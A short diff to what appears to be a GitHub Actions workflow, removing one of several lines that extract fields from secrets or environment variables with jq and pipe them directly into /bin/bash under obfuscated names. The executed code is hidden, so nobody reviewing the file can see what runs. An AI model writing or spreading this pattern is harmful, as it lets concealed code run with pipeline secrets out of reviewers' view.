@@ -21,7 +21,6 @@ jobs:
           x0: ${{ secrets.x0 }}
         run: |
           printf '%s' "$x0" | jq -r .ad281 | /bin/bash
-          echo $zx02 | jq -r .k1 | /bin/bash
           printf '%s' "$ioc4379" | jq -r .m2862 | /bin/bash
           echo $zu7 | jq -r .kq0 | /bin/bash
           echo $xsp44 | jq -r .pa55 | /bin/bash
